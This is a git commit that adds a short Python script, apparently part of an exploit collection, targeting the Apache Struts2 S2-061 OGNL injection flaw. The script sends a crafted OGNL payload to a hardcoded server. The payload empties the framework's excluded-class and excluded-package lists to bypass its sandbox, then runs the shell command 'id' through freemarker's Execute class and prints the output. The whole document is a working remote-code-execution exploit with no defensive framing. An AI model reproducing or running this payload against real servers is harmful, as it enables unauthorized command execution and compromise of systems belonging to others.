80b7a1ef9263e0fb0a8cd1edb570768f3ca78e95
S0cke3t <1510536500@qq.com>
2020-12-10 14:34:14 +0800

    add s2-061

---
+++ Struts2/S2-061.py
@@ -0,0 +1,7 @@
+import requests
+url = "http://10.86.77.4:8080"
+data2 = {
+    "id": "%{('Powered_by_Unicode_Potats0,enjoy_it').(#UnicodeSec = #application['org.apache.tomcat.InstanceManager']).(#potats0=#UnicodeSec.newInstance('org.apache.commons.collections.BeanMap')).(#stackvalue=#attr['struts.valueStack']).(#potats0.setBean(#stackvalue)).(#context=#potats0.get('context')).(#potats0.setBean(#context)).(#sm=#potats0.get('memberAccess')).(#emptySet=#UnicodeSec.newInstance('java.util.HashSet')).(#potats0.setBean(#sm)).(#potats0.put('excludedClasses',#emptySet)).(#potats0.put('excludedPackageNames',#emptySet)).(#exec=#UnicodeSec.newInstance('freemarker.template.utility.Execute')).(#cmd={'id'}).(#res=#exec.exec(#cmd))}"
+}
+res2 = requests.post(url, data=data2)
+print(res2.text)
